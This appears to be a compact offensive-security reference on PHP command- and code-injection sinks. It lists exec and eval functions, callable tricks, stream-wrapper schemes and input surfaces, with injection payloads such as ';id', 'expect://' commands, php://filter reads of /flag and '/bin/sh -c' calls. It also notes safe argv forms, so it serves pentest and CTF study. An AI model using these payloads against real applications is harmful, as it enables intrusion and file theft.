# PHP Deep — the sink-by-sink reference

## The exec-family — `system`/`exec`/`passthru`/`shell_exec`/backtick/`popen`/`proc_open`/`pcntl_exec`

| Sink | Output | Notes |
|---|---|---|
| `system($cmd)` | stdout→response (last line if captured) | the classic |
| `exec($cmd)` | last line — capture via `$exec($cmd,$out);print_r($out)` | captured-array |
| `passthru($cmd)` | raw stdout to response | binary-safe |
| `shell_exec($cmd)` | full stdout | `=``-equivalent |
| `` `$cmd` `` | full stdout | same as shell_exec |
| `popen($cmd,'r')` | stream | `fread`/`fgets`/`fpassthru` |
| `proc_open($cmd,$desc,$pipes)` | fd-map | full control |
| `pcntl_exec($cmd,$args)` | replace-process | no output |
| `expect_popen($cmd)` | expect-lib | rare |

## The concat-patterns — where `x` lands

```php
system('ping '.$host);           — host is the arg → ;id
system("ping $host");            — interp → ;id
system("ping {$host}");          — interp → ;id
system('ping '.escapeshellarg($host));  — quoted → arg-injection only
system("ping \"$host\"");        — quoted → ",-break then ;id? no — " is literal inside
exec('ping '.$host.' -c 4');     — host inside multi-arg
shell_exec('ping '.$host);       — same
`ping $host`;                    — backtick — same
popen('ping '.$host,'r');        — stream
passthru('ping '.$host);         — raw
proc_open('ping '.$host,...);    — full
```

## The safe-form — `exec`/`proc_open` with argv

```php
$out=[];exec('ping -c4 '.escapeshellarg($host),$out);  — arg-form
proc_open(['ping',$host],...);  — argv-array — SAFE
exec('ping -c4 '.intval($host)); — numeric
```

## The eval-family — `eval`/`assert`/`create_function`/`preg_replace_e`/`call_user_func`/`array_map`/`usort`/`array_filter`/`mb_ereg_replace_e`/`ReflectionFunction`/`ReflectionMethod`

```php
eval($x);                        — raw eval — code-injection
eval('echo '.$x.';');            — concat'd eval
assert($x);                      — assert-eval — older PHP
create_function('$x',$code);     — create_function — code-inj
preg_replace('/x/e',$x,'x');     — /e-modifier — php<5.5 — eval-per-match
mb_ereg_replace('x',$x,'x','e'); — mb-e-modifier — eval
call_user_func($x);              — func-name inject
call_user_func_array($f,[$x]);   — func+arg
array_map($x,[]);                — callable
usort($a,$x);                    — callable
array_filter($a,$x);             — callable
array_reduce($a,$x);             — callable
ReflectionFunction($x)           — reflect-invoke
ReflectionMethod($c,$m)          — reflect-invoke
$fn = $x; $fn();                 — variable-function
$x();                            — direct-call
$obj->$m();                      — method-call
```

The `7*7`/`phpversion()`/`'a'.'b'` probes fingerprint which evaluator
runs.

## The include-family — `include`/`require`/`include_once`/`require_once`/`auto_prepend_file`/`auto_append_file`

```php
include($x);                     — include — php-code or stream-wrapper
require($x);
include $x;
include "php://filter/convert.base64-encode/resource=$x";  — stream
include "data://text/plain;base64,...";                  — data-uri
include "phar://$x/x";                                    — phar-deser
include "expect://$x";                                    — expect
```

`include`/`require` of a user-controlled path — the path is the
injection — file-read/LFI not cmdi — `file-read-primitives`. But
`include "expect://x"`/`"phar://"`/`"php://"` scheme-args cross into
exec/read primitives.

## The stream-wrapper args — `php://`/`phar://`/`expect://`/`data://`/`file://`/`glob://`/`rar://`/`ssh2://`/`http://`/`ftp://`/`dict://`/`compress.*`/`zip://`/`ogg://`/`zlib`/`bzip2`

```
php://filter/read=convert.base64-encode/resource=/flag   — file-read
php://input                                               — raw-body
php://output                                              — stdout
php://stderr                                              — stderr
php://fd/N                                                — fd
data://text/plain;base64,Y2F0IC9mbGFn                    — inline
data://text/plain,<?php phpinfo();                        — inline
phar://x.phar/x                                           — phar-file
phar://x.phar/x/x                                         — phar-subfile
expect://id                                               — expect-cmd
expect://cat%20/flag                                      — expect-cmd
file:///flag                                              — file
glob:///*flag*                                            — glob
rar://x.rar%x                                             — rar
zip://x.zip%x                                             — zip
compress.zlib://x                                         — zlib
compress.bzip2://x                                        — bzip2
ssh2.shell://x/id                                         — ssh2-shell
http://x/flag                                             — http-fetch
ftp://x/flag                                              — ftp-fetch
dict://x:port/info                                        — dict
```

## The `preg_*`/`mb_ereg`/`ereg` modifiers — `/e` (eval-per-match)

```php
preg_replace('/x/e','id','x');   — php<5.5 — /e evals the replacement
mb_ereg_replace('x','id','x','e'); — mb-e
preg_replace('/(.*)/e','id',$x); — x's match evals
```

`/e` was removed in PHP 5.5 — `preg_replace_callback` is the modern
callback — but the callback-name can be user-controlled:
`preg_replace_callback('/x/',$cb,'x')` — `$cb` user-set → func-name
injection.

## The `unserialize`/`call_user_func`/`array_*` callable tricks — function-name injection

```php
call_user_func('system','id');
call_user_func_array('system',['id']);
array_map('system',['id']);
array_map($fn,$argv);            — $fn user-set
usort($a,'system');              — wrong-arg-count but callable
array_filter($a,'system');       — callable
array_reduce($a,'system');       — callable
$x='system';$x('id');            — var-function
$x='system';call_user_func($x,'id');
$f=new ReflectionFunction('system');$f->invoke('id');
$m=new ReflectionMethod('C','m');$m->invoke($o,'id');
```

## The `$_GET`/`$_REQUEST`/`$_SERVER` surfaces — which input the sink sees

```php
system('ping '.$_GET['host']);           — ?host=
system('ping '.$_REQUEST['host']);       — ?host= or POST host=
system('ping '.$_SERVER['HTTP_X_H']);    — header
system('ping '.$_COOKIE['h']);           — cookie
system('ping '.$_FILES['f']['name']);    — filename
system('ping '.$_POST['host']);          — body
system('ping '.getenv('X'));             — env-var
```

`$_SERVER['HTTP_*']`/`$_COOKIE`/`$_FILES`/`php://input` — the non-obvious
input points.

## The `escapeshellarg`/`escapeshellcmd`/`addslashes` gate — what each allows

`escapeshell-bypasses.md` — the full table. The summary: arg-position
flags always live; `\n`-survival in old escapeshellcmd; the `'`-quote-
pair boundary.

## The `proc_open` descriptor-array shape

```php
proc_open('ping '.$x,[
  0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w'],
],$pipes);
// the command-string is shelled — ;id
proc_open(['ping',$x],...);   // php7.4+ argv-array — safe
```

## The `pcntl_exec`/`posix_*`/`proc_nice`/`pcntl_alarm`/`pcntl_fork` — posix-side

```php
pcntl_exec('/bin/sh',['-c','id']);   — replace-process
posix_kill(posix_getpid(),9);        — signal-self
posix_setuid(0);                     — uid-set
posix_setgid(0);
posix_getpwuid(posix_getuid());      — user-info
posix_uname();                       — uname
```

## The `iconv`/`mb_convert`/charset-injection — encoding the boundary

`iconv('UTF-8','x',$x)`/`mb_convert_encoding`/`iconv_mime_decode` —
charset-transforms may drop or reinterpret metas — `%C0%BB`/`%E0%80%BB`
overlong tricks survive if the transform is permissive — `waf-bypass.md`.

## The "PHP-side but the shell is the boundary" — the real inject points

- `system("ping $x")` — `$x` inside `"..."` — `$x`'s `;` splits
- `system('ping '.$x)` — `'ping '.$x` — `$x`'s `;` splits
- `shell_exec("ping $x")` — same
- `` `ping $x` `` — backtick — same
- `popen("ping $x","r")` — stream — same
- `exec("ping $x",$o)` — captured — `$o[]` carries stdout
- `passthru("ping $x")` — raw stdout

## The variables-that-look-safe — `'ping '.$x` but $x has metas

`$x` could come from `$_GET`/`$_POST`/`$_COOKIE`/`$_SERVER`/`$_FILES`/
`$_REQUEST`/`file_get_contents()`/`$argv`/`env`/`JSON`/`unserialize`/
`include`/`eval` — trace backward.

## Falsifiers

- every PHP sink is argv-form/escapeshellarg'd-and-flagless AND no
  evaluator reachable → dead

## Output to record

- the sink-line + the input-path + the verbatim output
